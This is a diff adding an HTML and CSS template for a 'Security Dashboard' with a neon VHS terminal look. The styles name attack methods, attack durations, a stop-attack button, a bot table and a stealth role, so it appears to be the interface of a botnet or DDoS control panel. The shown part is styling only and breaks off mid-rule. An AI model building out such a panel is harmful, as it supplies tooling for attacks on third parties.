@@ -1,0 +1,3146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Dashboard</title>
+    <meta name="csrf-token" content="{{.CSRFToken}}">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link  rel="stylesheet">
+    <style>
+      /* ==================== */
+      /* VHS TERMINAL THEME   */
+      /* ==================== */
+      :root {
+        --primary: #00ff9d;
+        --secondary: #00b8ff;
+        --accent: #00ff9d;
+        --dim: #6b7280;
+        --dark: #0a0e17;
+        --darker: #05080f;
+        --darkest: #000000;
+        --light: #e0e0e0;
+        --success: #00ff9d;
+        --warning: #ffcc00;
+        --danger: #ff3333;
+        --info: #00b8ff;
+        --scanline: rgba(0, 255, 157, 0.03);
+        --glow: rgba(0, 255, 157, 0.7);
+        --vhs-flicker: rgba(0, 255, 157, 0.1);
+        --vhs-bleed: rgba(0, 255, 157, 0.05);
+      }
+
+      /* ==================== */
+      /* BASE STYLES          */
+      /* ==================== */
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: 'Courier New', monospace;
+        background-color: var(--darkest);
+        color: var(--primary);
+        line-height: 1.4;
+        overflow-x: hidden;
+        text-shadow: 0 0 5px var(--glow);
+        position: relative;
+      }
+
+      /* VHS Scanline Effect */
+      body::before {
+        content: "";
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(
+            to bottom,
+            transparent 0%,
+            var(--scanline) 50%,
+            transparent 100%
+          ),
+          repeating-linear-gradient(
+            to bottom,
+            transparent,
+            transparent 1px,
+            var(--scanline) 2px,
+            var(--scanline) 3px,
+            transparent 4px
+          );
+        background-size: 100% 6px;
+        pointer-events: none;
+        z-index: 9999;
+        mix-blend-mode: overlay;
+        animation: scanlines 2.4s linear infinite;
+      }
+
+      @keyframes scanlines {
+        from { background-position: 0 0; }
+        to { background-position: 0 6px; }
+      }
+
+      /* VHS Flicker Effect */
+      @keyframes flicker {
+        0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
+          opacity: 0.99;
+          text-shadow: 0 0 5px var(--glow);
+        }
+        20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
+          opacity: 0.4;
+          text-shadow: none;
+        }
+      }
+
+      /* VHS Noise Effect */
+      body::after {
+        content: "";
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABGSURBVGhD7cExAQAwDMCg+zfd2VAEJPBfWgVJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJ+o8Hj5QAZeZ1a7QAAAAASUVORK5CYII=');
+        opacity: 0.03;
+        pointer-events: none;
+        z-index: 9998;
+      }
+
+      /* ==================== */
+      /* TYPOGRAPHY           */
+      /* ==================== */
+      .cyber-title {
+        font-family: 'Courier New', monospace;
+        font-weight: 700;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        color: var(--primary);
+        text-shadow: 0 0 8px var(--glow);
+        animation: flicker 8s infinite alternate;
+      }
+
+      .cyber-subtitle {
+        font-family: 'Courier New', monospace;
+        font-size: 0.75rem;
+        color: var(--dim);
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .text-primary {
+        color: var(--primary);
+        text-shadow: 0 0 5px var(--glow);
+      }
+
+      .text-secondary {
+        color: var(--secondary);
+        text-shadow: 0 0 5px rgba(0, 184, 255, 0.7);
+      }
+
+      .text-accent {
+        color: var(--accent);
+        text-shadow: 0 0 5px var(--glow);
+      }
+
+      .text-dim {
+        color: var(--dim);
+        text-shadow: 0 0 3px rgba(0, 255, 157, 0.3);
+      }
+
+      .text-success {
+        color: var(--success);
+        text-shadow: 0 0 5px var(--glow);
+      }
+
+      .text-warning {
+        color: var(--warning);
+        text-shadow: 0 0 5px rgba(255, 204, 0, 0.7);
+      }
+
+      .text-danger {
+        color: var(--danger);
+        text-shadow: 0 0 5px rgba(255, 51, 51, 0.7);
+      }
+
+      .text-info {
+        color: var(--info);
+        text-shadow: 0 0 5px rgba(0, 184, 255, 0.7);
+      }
+
+      .font-mono {
+        font-family: 'Courier New', monospace;
+      }
+
+      /* ==================== */
+      /* LAYOUT               */
+      /* ==================== */
+      .flex {
+        display: flex;
+      }
+
+      .flex-col {
+        flex-direction: column;
+      }
+
+      .min-h-screen {
+        min-height: 100vh;
+      }
+
+      /* ==================== */
+      /* HEADER               */
+      /* ==================== */
+      .dashboard-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem 2rem;
+        background-color: rgba(5, 8, 15, 0.8);
+        border-bottom: 1px solid rgba(0, 255, 157, 0.2);
+        backdrop-filter: blur(5px);
+        position: sticky;
+        top: 0;
+        z-index: 50;
+        box-shadow: 0 0 15px rgba(0, 255, 157, 0.1);
+      }
+
+      .logo-container {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+      }
+
+      .logo-icon {
+        width: 2rem;
+        height: 2rem;
+        color: var(--primary);
+        filter: drop-shadow(0 0 5px var(--glow));
+      }
+
+      .header-controls {
+        display: flex;
+        align-items: center;
+        gap: 1.5rem;
+      }
+
+      .connection-status {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .status-indicator {
+        display: inline-block;
+        width: 0.75rem;
+        height: 0.75rem;
+        border-radius: 9999px;
+        box-shadow: 0 0 5px currentColor;
+      }
+
+      .status-active {
+        background-color: var(--success);
+        animation: pulse 2s infinite;
+      }
+
+      .status-inactive {
+        background-color: var(--danger);
+        animation: pulse 1s infinite;
+      }
+
+      @keyframes pulse {
+        0% { opacity: 0.7; }
+        50% { opacity: 1; }
+        100% { opacity: 0.7; }
+      }
+
+      .connection-text {
+        font-family: 'Courier New', monospace;
+        font-size: 0.875rem;
+        color: var(--dim);
+        text-shadow: 0 0 3px rgba(0, 255, 157, 0.3);
+      }
+
+      .profile-dropdown-container {
+        position: relative;
+      }
+
+      .profile-button {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        background: rgba(0, 255, 157, 0.1);
+        border: 1px solid rgba(0, 255, 157, 0.2);
+        border-radius: 0.25rem;
+        cursor: pointer;
+        padding: 0.5rem 1rem;
+        transition: all 0.2s;
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .profile-button:hover {
+        background-color: rgba(0, 255, 157, 0.2);
+        box-shadow: 0 0 10px rgba(0, 255, 157, 0.2);
+      }
+
+      .cyber-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.25rem;
+        font-family: 'Courier New', monospace;
+        font-size: 0.75rem;
+        padding: 0.25rem 0.5rem;
+        border-radius: 0.25rem;
+        text-transform: uppercase;
+        text-shadow: none;
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+      }
+
+      .cyber-badge-owner {
+        background-color: rgba(0, 255, 157, 0.2);
+        color: var(--primary);
+        border: 1px solid var(--primary);
+      }
+
+      .cyber-badge-admin {
+        background-color: rgba(0, 184, 255, 0.2);
+        color: var(--secondary);
+        border: 1px solid var(--secondary);
+      }
+
+      .cyber-badge-stealth {
+        background-color: rgba(0, 255, 157, 0.2);
+        color: var(--primary);
+        border: 1px solid var(--primary);
+      }
+
+      .cyber-badge-maintenance {
+        background-color: rgba(255, 204, 0, 0.2);
+        color: var(--warning);
+        border: 1px solid var(--warning);
+      }
+
+      .cyber-badge-user {
+        background-color: rgba(107, 114, 128, 0.2);
+        color: var(--dim);
+        border: 1px solid var(--dim);
+      }
+
+      .cyber-badge-destructive {
+        background-color: rgba(255, 51, 51, 0.2);
+        color: var(--danger);
+        border: 1px solid var(--danger);
+      }
+
+      .cyber-dropdown {
+        position: absolute;
+        right: 0;
+        top: 100%;
+        margin-top: 0.5rem;
+        min-width: 16rem;
+        background-color: var(--darker);
+        border: 1px solid rgba(0, 255, 157, 0.2);
+        border-radius: 0.375rem;
+        box-shadow: 0 0 20px rgba(0, 255, 157, 0.1);
+        z-index: 50;
+        overflow: hidden;
+      }
+
+      @keyframes vhsFlickerIn {
+        0% { opacity: 0; transform: translateY(-10px); }
+        20% { opacity: 0.3; }
+        40% { opacity: 0.1; }
+        60% { opacity: 0.6; }
+        80% { opacity: 0.2; }
+        100% { opacity: 1; transform: translateY(0); }
+      }
+
+      .cyber-dropdown.hidden {
+        display: none;
+      }
+
+      .profile-info {
+        padding: 1rem;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.1);
+        background: linear-gradient(
+          to right,
+          transparent 0%,
+          rgba(0, 255, 157, 0.05) 50%,
+          transparent 100%
+        );
+      }
+
+      .dropdown-actions {
+        padding: 0.25rem;
+      }
+
+      .cyber-dropdown-item {
+        display: flex;
+        align-items: center;
+        width: 100%;
+        padding: 0.5rem 1rem;
+        text-align: left;
+        background: none;
+        border: none;
+        color: var(--light);
+        cursor: pointer;
+        transition: all 0.2s;
+        border-radius: 0.25rem;
+        font-family: 'Courier New', monospace;
+      }
+
+      .cyber-dropdown-item:hover {
+        background-color: rgba(0, 255, 157, 0.1);
+        color: var(--primary);
+        text-shadow: 0 0 5px var(--glow);
+      }
+
+      .cyber-dropdown-item i {
+        margin-right: 0.75rem;
+        width: 1.25rem;
+        text-align: center;
+      }
+
+      /* ==================== */
+      /* FLASH MESSAGES       */
+      /* ==================== */
+      .cyber-flash {
+        position: fixed;
+        top: 1rem;
+        left: 50%;
+        transform: translateX(-50%);
+        display: flex;
+        align-items: center;
+        padding: 0.75rem 1.25rem;
+        background-color: var(--darker);
+        border: 1px solid rgba(0, 255, 157, 0.2);
+        border-radius: 0.375rem;
+        box-shadow: 0 0 20px rgba(0, 255, 157, 0.1);
+        z-index: 100;
+        animation: slideIn 0.3s ease-out, vhsFlicker 5s infinite;
+        transition: opacity 0.3s ease;
+        font-family: 'Courier New', monospace;
+      }
+
+      @keyframes vhsFlicker {
+        0%, 100% { opacity: 0.95; }
+        2% { opacity: 0.6; }
+        4% { opacity: 0.8; }
+        7% { opacity: 0.4; }
+        8% { opacity: 1; }
+      }
+
+      .cyber-flash.success {
+        border-left: 4px solid var(--success);
+        box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
+      }
+
+      .cyber-flash.error {
+        border-left: 4px solid var(--danger);
+        box-shadow: 0 0 15px rgba(255, 51, 51, 0.2);
+      }
+
+      .cyber-flash.info {
+        border-left: 4px solid var(--info);
+        box-shadow: 0 0 15px rgba(0, 184, 255, 0.2);
+      }
+
+      .cyber-flash.warning {
+        border-left: 4px solid var(--warning);
+        box-shadow: 0 0 15px rgba(255, 204, 0, 0.2);
+      }
+
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translate(-50%, -1rem);
+        }
+        to {
+          opacity: 1;
+          transform: translate(-50%, 0);
+        }
+      }
+
+      .cyber-flash-btn {
+        margin-left: 1rem;
+        background: none;
+        border: none;
+        color: var(--dim);
+        cursor: pointer;
+        transition: color 0.2s;
+      }
+
+      .cyber-flash-btn:hover {
+        color: var(--light);
+      }
+
+      /* ==================== */
+      /* ENHANCED SELECT & DATE PICKER STYLES */
+      /* ==================== */
+
+      /* Custom Select Dropdown (for Method Select) */
+      .cyber-select {
+        appearance: none;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%2300ff9d' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 0.75rem center;
+        background-size: 16px 12px;
+        padding-right: 2.5rem;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .cyber-select:hover {
+        border-color: rgba(0, 255, 157, 0.4);
+        box-shadow: 0 0 10px rgba(0, 255, 157, 0.1);
+      }
+
+      .cyber-select:focus {
+        outline: none;
+        border-color: var(--primary);
+        box-shadow: 0 0 0 3px rgba(0, 255, 157, 0.2);
+      }
+
+      /* Custom Dropdown Options */
+      .cyber-select option {
+        background-color: var(--darker);
+        color: var(--primary);
+        border: none;
+        font-family: 'Courier New', monospace;
+      }
+
+      .cyber-select option:hover {
+        background-color: rgba(0, 255, 157, 0.2);
+      }
+
+      /* Date Picker Custom Styles */
+      .cyber-input[type="date"] {
+        padding-right: 2.5rem;
+        cursor: pointer;
+      }
+
+      .cyber-input[type="date"]::-webkit-calendar-picker-indicator {
+        filter: invert(0.7) sepia(1) saturate(5) hue-rotate(125deg);
+        cursor: pointer;
+        opacity: 0.7;
+        transition: opacity 0.2s;
+      }
+
+      .cyber-input[type="date"]::-webkit-calendar-picker-indicator:hover {
+        opacity: 1;
+      }
+
+      .cyber-input[type="date"]::-webkit-datetime-edit-fields-wrapper {
+        color: var(--primary);
+      }
+
+      .cyber-input[type="date"]::-webkit-datetime-edit-text {
+        color: var(--dim);
+        padding: 0 0.2em;
+      }
+
+      /* Date Picker Dropdown */
+      .cyber-input[type="date"]::-webkit-inner-spin-button {
+        display: none;
+      }
+
+      .cyber-input[type="date"]::-webkit-clear-button {
+        display: none;
+      }
+
+      /* Firefox Date Picker */
+      .cyber-input[type="date"]::-moz-calendar-picker-indicator {
+        filter: invert(0.7) sepia(1) saturate(5) hue-rotate(125deg);
+        cursor: pointer;
+        opacity: 0.7;
+        transition: opacity 0.2s;
+      }
+
+      .cyber-input[type="date"]::-moz-calendar-picker-indicator:hover {
+        opacity: 1;
+      }
+
+      /* Date Picker Calendar Popup */
+      ::-webkit-date-and-time-value {
+        text-align: left;
+      }
+
+      /* Calendar Dropdown Styling */
+      /* Note: These styles have limited browser support but will work in modern browsers */
+      .cyber-input[type="date"]::-webkit-calendar-picker-indicator {
+        background: transparent;
+        bottom: 0;
+        color: transparent;
+        cursor: pointer;
+        height: auto;
+        left: 0;
+        position: absolute;
+        right: 0;
+        top: 0;
+        width: auto;
+      }
+
+      /* Calendar Popup Container (limited styling control) */
+      ::-webkit-datetime-edit,
+      ::-webkit-inner-spin-button,
+      ::-webkit-clear-button {
+        color: var(--primary);
+        position: relative;
+      }
+
+      ::-webkit-datetime-edit-fields-wrapper {
+        background: var(--darker);
+      }
+
+      ::-webkit-datetime-edit-text {
+        color: var(--primary);
+        padding: 0 0.3em;
+      }
+
+      /* Month/Year Selector in Calendar */
+      ::-webkit-datetime-edit-month-field,
+      ::-webkit-datetime-edit-day-field,
+      ::-webkit-datetime-edit-year-field {
+        color: var(--primary);
+        background: var(--darker);
+      }
+
+      /* Calendar Day Cells */
+      ::-webkit-calendar-picker-indicator {
+        background: transparent;
+      }
+
+      /* Hover/Focus States for Calendar */
+      ::-webkit-calendar-picker-indicator:hover {
+        background: rgba(0, 255, 157, 0.1);
+      }
+
+      /* ==================== */
+      /* METRICS GRID         */
+      /* ==================== */
+      .metrics-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+        gap: 1rem;
+        padding: 1rem 2rem;
+      }
+
+      .cyber-panel {
+        background-color: var(--darker);
+        border: 1px solid rgba(0, 255, 157, 0.2);
+        border-radius: 0.5rem;
+        overflow: hidden;
+        transition: all 0.3s ease;
+        box-shadow: 0 0 15px rgba(0, 255, 157, 0.1);
+        position: relative;
+        padding: 12px 10px 16px 10px;
+      }
+
+      .cyber-panel::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 1px;
+        background: linear-gradient(
+          90deg,
+          transparent 0%,
+          var(--primary) 50%,
+          transparent 100%
+        );
+        z-index: 1;
+      }
+
+      .cyber-panel:hover {
+        border-color: rgba(0, 255, 157, 0.4);
+        box-shadow: 0 0 25px rgba(0, 255, 157, 0.2);
+      }
+
+      .metric-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.1);
+        background: linear-gradient(
+          to right,
+          transparent 0%,
+          rgba(0, 255, 157, 0.05) 50%,
+          transparent 100%
+        );
+      }
+
+      .cyber-metric-label {
+        font-family: 'Courier New', monospace;
+        font-size: 0.875rem;
+        color: var(--dim);
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        text-shadow: 0 0 3px rgba(0, 255, 157, 0.3);
+      }
+
+      .metric-icon {
+        width: 2.5rem;
+        height: 2.5rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: rgba(0, 255, 157, 0.1);
+        border-radius: 9999px;
+        color: var(--primary);
+        box-shadow: 0 0 10px rgba(0, 255, 157, 0.1);
+      }
+
+      .cyber-metric {
+        padding: 1.5rem 1rem;
+        font-size: 2rem;
+        font-weight: 700;
+        text-align: center;
+        color: var(--primary);
+        text-shadow: 0 0 10px var(--glow);
+        font-family: 'Courier New', monospace;
+        animation: flicker 8s infinite alternate;
+      }
+
+      /* ==================== */
+      /* MAIN CONTENT         */
+      /* ==================== */
+      .dashboard-main {
+        display: grid;
+        grid-template-columns: 1fr;
+        gap: 1.5rem;
+        padding: 0 2rem 2rem;
+        flex: 1;
+      }
+
+      @media (min-width: 1024px) {
+        .dashboard-main {
+          grid-template-columns: 1fr 1fr;
+        }
+      }
+
+      .panel-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.1);
+        background: linear-gradient(
+          to right,
+          transparent 0%,
+          rgba(0, 255, 157, 0.05) 50%,
+          transparent 100%
+        );
+      }
+
+      .panel-header h2 {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        font-family: 'Courier New', monospace;
+      }
+
+      /* ==================== */
+      /* TABLES               */
+      /* ==================== */
+      .cyber-table {
+        width: 100%;
+        border-collapse: collapse;
+        font-family: 'Courier New', monospace;
+        font-size: 0.875rem;
+        position: relative;
+      }
+
+      .cyber-table th {
+        padding: 0.75rem 1rem;
+        text-align: left;
+        background-color: rgba(0, 255, 157, 0.1);
+        color: var(--dim);
+        text-transform: uppercase;
+        font-size: 0.75rem;
+        letter-spacing: 0.05em;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.2);
+        text-shadow: 0 0 3px rgba(0, 255, 157, 0.3);
+      }
+
+      .cyber-table td {
+        padding: 0.75rem 1rem;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.05);
+      }
+
+      .cyber-table tr:last-child td {
+        border-bottom: none;
+      }
+
+      .cyber-table tr:hover td {
+        background-color: rgba(0, 255, 157, 0.05);
+        text-shadow: 0 0 5px var(--glow);
+      }
+
+      .bot-table-header th {
+        background-color: rgba(0, 184, 255, 0.1);
+        border-bottom: 1px solid rgba(0, 184, 255, 0.2);
+      }
+
+      .bot-table-body tr:hover td {
+        background-color: rgba(0, 184, 255, 0.05);
+      }
+
+      /* ==================== */
+      /* CUSTOM SCROLLBAR     */
+      /* ==================== */
+      .custom-scrollbar {
+        max-height: 400px;
+        overflow-y: auto;
+      }
+
+      .custom-scrollbar::-webkit-scrollbar {
+        width: 6px;
+        height: 6px;
+      }
+
+      .custom-scrollbar::-webkit-scrollbar-track {
+        background: rgba(0, 255, 157, 0.05);
+        border-radius: 3px;
+      }
+
+      .custom-scrollbar::-webkit-scrollbar-thumb {
+        background: rgba(0, 255, 157, 0.3);
+        border-radius: 3px;
+      }
+
+      .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+        background: rgba(0, 255, 157, 0.5);
+      }
+
+      /* ==================== */
+      /* ATTACK METHOD BADGES */
+      /* ==================== */
+      .attack-method-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.5rem;
+        padding: 0.25rem 0.5rem;
+        border-radius: 0.25rem;
+        background-color: rgba(0, 255, 157, 0.1);
+        border: 1px solid rgba(0, 255, 157, 0.2);
+        font-size: 0.75rem;
+        font-family: 'Courier New', monospace;
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      /* ==================== */
+      /* BUTTONS              */
+      /* ==================== */
+      .cyber-btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        padding: 0.5rem 1rem;
+        background-color: rgba(0, 255, 157, 0.1);
+        color: var(--primary);
+        border: 1px solid rgba(0, 255, 157, 0.3);
+        border-radius: 0.25rem;
+        font-family: 'Courier New', monospace;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+        cursor: pointer;
+        transition: all 0.2s;
+        text-shadow: 0 0 5px var(--glow);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .cyber-btn::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(
+          to bottom right,
+          transparent 45%,
+          rgba(0, 255, 157, 0.3) 50%,
+          transparent 55%
+        );
+        transform: rotate(30deg);
+        transition: all 0.3s;
+        opacity: 0;
+      }
+
+      .cyber-btn:hover {
+        background-color: rgba(0, 255, 157, 0.2);
+        border-color: rgba(0, 255, 157, 0.5);
+        transform: translateY(-1px);
+        box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
+      }
+
+      .cyber-btn:hover::before {
+        animation: shine 1.5s;
+      }
+
+      @keyframes shine {
+        0% { opacity: 0; transform: rotate(30deg) translate(-30%, -30%); }
+        20% { opacity: 1; }
+        100% { opacity: 0; transform: rotate(30deg) translate(30%, 30%); }
+      }
+
+      .cyber-btn:active {
+        transform: translateY(0);
+      }
+
+      .cyber-btn i {
+        font-size: 0.875rem;
+      }
+
+      .cyber-btn.destructive {
+        background-color: rgba(255, 51, 51, 0.1);
+        color: var(--danger);
+        border-color: rgba(255, 51, 51, 0.3);
+        text-shadow: 0 0 5px rgba(255, 51, 51, 0.7);
+      }
+
+      .cyber-btn.destructive:hover {
+        background-color: rgba(255, 51, 51, 0.2);
+        border-color: rgba(255, 51, 51, 0.5);
+        box-shadow: 0 0 15px rgba(255, 51, 51, 0.2);
+      }
+
+      .cyber-btn.destructive::before {
+        background: linear-gradient(
+          to bottom right,
+          transparent 45%,
+          rgba(255, 51, 51, 0.3) 50%,
+          transparent 55%
+        );
+      }
+
+      .attack-stop-btn {
+        display: inline-flex;
+        align-items: center;
+        padding: 0.25rem 0.5rem;
+        background-color: rgba(255, 51, 51, 0.1);
+        color: var(--danger);
+        border: 1px solid rgba(255, 51, 51, 0.2);
+        border-radius: 0.25rem;
+        font-size: 0.75rem;
+        transition: all 0.2s;
+        font-family: 'Courier New', monospace;
+        text-shadow: 0 0 3px rgba(255, 51, 51, 0.7);
+      }
+
+      .attack-stop-btn:hover {
+        background-color: rgba(255, 51, 51, 0.2);
+        border-color: rgba(255, 51, 51, 0.3);
+        text-shadow: 0 0 5px rgba(255, 51, 51, 0.7);
+      }
+
+      .delete-btn {
+        display: inline-flex;
+        align-items: center;
+        padding: 0.25rem 0.5rem;
+        background-color: rgba(255, 51, 51, 0.1);
+        color: var(--danger);
+        border: 1px solid rgba(255, 51, 51, 0.2);
+        border-radius: 0.25rem;
+        font-size: 0.75rem;
+        transition: all 0.2s;
+        font-family: 'Courier New', monospace;
+        text-shadow: 0 0 3px rgba(255, 51, 51, 0.7);
+      }
+
+      .delete-btn:hover {
+        background-color: rgba(255, 51, 51, 0.2);
+        border-color: rgba(255, 51, 51, 0.3);
+        text-shadow: 0 0 5px rgba(255, 51, 51, 0.7);
+      }
+
+      .delete-btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+
+      .cancel-btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        padding: 0.5rem 1rem;
+        background-color: rgba(107, 114, 128, 0.1);
+        color: var(--dim);
+        border: 1px solid rgba(107, 114, 128, 0.2);
+        border-radius: 0.25rem;
+        font-family: 'Courier New', monospace;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+        cursor: pointer;
+        transition: all 0.2s;
+        text-shadow: none;
+      }
+
+      .cancel-btn:hover {
+        background-color: rgba(107, 114, 128, 0.2);
+        border-color: rgba(107, 114, 128, 0.3);
+      }
+
+      /* ==================== */
+      /* FORMS                */
+      /* ==================== */
+      .attack-form {
+        padding: 1rem;
+      }
+
+      .form-group {
+        margin-bottom: 1.25rem;
+      }
+
+      .form-group label {
+        display: block;
+        margin-bottom: 0.5rem;
+        font-family: 'Courier New', monospace;
+      }
+
+      .cyber-input {
+        width: 100%;
+        padding: 0.75rem 1rem;
+        background-color: rgba(0, 255, 157, 0.05);
+        border: 1px solid rgba(0, 255, 157, 0.2);
+        border-radius: 0.25rem;
+        color: var(--light);
+        font-family: 'Courier New', monospace;
+        transition: all 0.2s;
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .cyber-input:focus {
+        outline: none;
+        border-color: rgba(0, 255, 157, 0.4);
+        box-shadow: 0 0 0 3px rgba(0, 255, 157, 0.1);
+        text-shadow: 0 0 5px var(--glow);
+      }
+
+      .cyber-input::placeholder {
+        color: var(--dim);
+        opacity: 0.7;
+        text-shadow: none;
+      }
+
+      .cyber-select {
+        width: 100%;
+        padding: 0.75rem 1rem;
+        background-color: rgba(0, 255, 157, 0.05);
+        border: 1px solid rgba(0, 255, 157, 0.2);
+        border-radius: 0.25rem;
+        color: var(--light);
+        font-family: 'Courier New', monospace;
+        transition: all 0.2s;
+        appearance: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%2300ff9d' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 0.75rem center;
+        background-size: 16px 12px;
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .cyber-select:focus {
+        outline: none;
+        border-color: rgba(0, 255, 157, 0.4);
+        box-shadow: 0 0 0 3px rgba(0, 255, 157, 0.1);
+      }
+
+      .duration-limits {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 0.25rem;
+        font-size: 0.75rem;
+        color: var(--dim);
+        font-family: 'Courier New', monospace;
+      }
+
+      .validation-error {
+        margin-top: 0.25rem;
+        font-size: 0.75rem;
+        color: var(--danger);
+        text-shadow: 0 0 3px rgba(255, 51, 51, 0.7);
+        font-family: 'Courier New', monospace;
+      }
+
+      .form-footer {
+        margin-top: 1.5rem;
+        display: flex;
+        justify-content: flex-end;
+      }
+
+      .attack-submit-btn {
+        width: 100%;
+        padding: 0.75rem 1.5rem;
+        font-size: 1rem;
+        font-weight: 700;
+        font-family: 'Courier New', monospace;
+      }
+
+      .password-input {
+        position: relative;
+      }
+
+      .password-toggle {
+        position: absolute;
+        right: 0.75rem;
+        top: 50%;
+        transform: translateY(-50%);
+        background: none;
+        border: none;
+        color: var(--dim);
+        cursor: pointer;
+        transition: color 0.2s;
+        text-shadow: none;
+      }
+
+      .password-toggle:hover {
+        color: var(--light);
+        text-shadow: 0 0 3px var(--glow);
+      }
+
+      .password-requirements {
+        margin-top: 0.5rem;
+        font-size: 0.75rem;
+        color: var(--dim);
+        font-family: 'Courier New', monospace;
+      }
+
+      .password-requirements div {
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+        margin-bottom: 0.25rem;
+      }
+
+      .password-requirements i {
+        width: 1rem;
+        text-align: center;
+      }
+
+      .date-input {
+        position: relative;
+      }
+
+      .date-input i {
+        position: absolute;
+        right: 0.75rem;
+        top: 50%;
+        transform: translateY(-50%);
+        color: var(--dim);
+        text-shadow: none;
+      }
+
+      .date-picker {
+        padding-right: 2.5rem;
+      }
+
+      .form-actions {
+        display: flex;
+        justify-content: flex-end;
+        gap: 0.75rem;
+        margin-top: 1.5rem;
+      }
+
+      /* ==================== */
+      /* ADMIN PANEL          */
+      /* ==================== */
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(5, 8, 15, 0.95);
+        backdrop-filter: blur(5px);
+        z-index: 100;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 2rem;
+        overflow-y: auto;
+      }
+
+      .overlay.hidden {
+        display: none;
+      }
+
+      .modal {
+        width: 100%;
+        max-width: 800px;
+        background-color: var(--darker);
+        border: 1px solid rgba(0, 255, 157, 0.3);
+        border-radius: 0.5rem;
+        overflow: hidden;
+        box-shadow: 0 0 30px rgba(0, 255, 157, 0.2);
+        animation: modalFadeIn 0.3s ease-out;
+        position: relative;
+      }
+
+      .modal::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 1px;
+        background: linear-gradient(
+          90deg,
+          transparent 0%,
+          var(--primary) 50%,
+          transparent 100%
+        );
+        z-index: 1;
+      }
+
+      @keyframes modalFadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(-1rem);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1.5rem;
+        border-bottom: 1px solid rgba(0, 255, 157, 0.2);
+        background: linear-gradient(
